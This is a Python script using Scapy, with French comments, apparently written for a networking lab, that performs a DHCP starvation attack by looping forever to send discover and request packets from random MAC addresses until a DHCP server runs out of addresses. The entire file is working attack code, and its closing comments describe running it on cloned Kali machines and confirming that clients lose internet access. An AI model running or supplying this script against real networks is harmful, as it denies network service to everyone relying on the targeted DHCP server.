#dhcp est un protocole qui permert d'attribuer des adresse ip a des clients
#il permet de configurer un plage d'adresse ip disponible
#fonctionnement : discover , offer, request, ack
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DHCP Starvation')
    parser.add_argument('-i', '--iface', type=str, default="eth0", help='Interface you wish to use')
    parser.add_argument('-t', '--target', type=str, default='255.255.255.255', help='IP of target server')
    args = parser.parse_args()

    target_ip = args.target
    iface = args.iface

try:
    mac = RandMAC()# permet de simuler des adresse mac differente pour saturer les ip
    
    #les adresses mac sont comme un identifiant lors d'un DHCP discover
    #ether envoie une demande sur le reseau en dst broadcast pour trouver un dhcp server
    #ip est la pour savoir ou envoyer l'ip
    #udp achemine au  port de destinantion
    #bootp achemine des information sur l'adresse mac
    while True:
        dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / IP(src='0.0.0.0', dst=str(target_ip))/ UDP(sport=68, dport=67)/ BOOTP(chaddr=mac)/ DHCP(options=[("message-type", "discover"), ("max_dhcp_size", 1500), ("client_id", mac2str(mac)),("lease_time", 10000), ("end", "0")])
        print(sendp(dhcp_discover, iface=str(iface), verbose=1)) # envoie des paquets sur la couches physique en utilisant l'adresse mac iface est le nombre de fois que ca envoie et verbose les details envoyer
        p = sniff(1, filter="udp and (port 67 or 68)", timeout=10)[0];r = p[BOOTP].yiaddr
        dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / IP(src='0.0.0.0', dst=str(target_ip))/ UDP(sport=68, dport=67)/ BOOTP(chaddr=mac)/ DHCP(options=[("message-type", "request"), ("max_dhcp_size", 1500), ("client_id", mac2str(mac)),("lease_time", 10000),("requested_addr", r), ("end", "0")])
        sendp(dhcp_request, iface=iface, verbose=False)
except KeyboardInterrupt:
    print("ERROR")


# a tester sur kali5 clone pour le server dhcp et kali5 clone clone  pour le client
# sur le server lancer sudo service isc-dhcp-server start 
# et verifier le status running
 
#sur le server lancer exo1.py puis lancer youtube pour verifier que internet marche pas
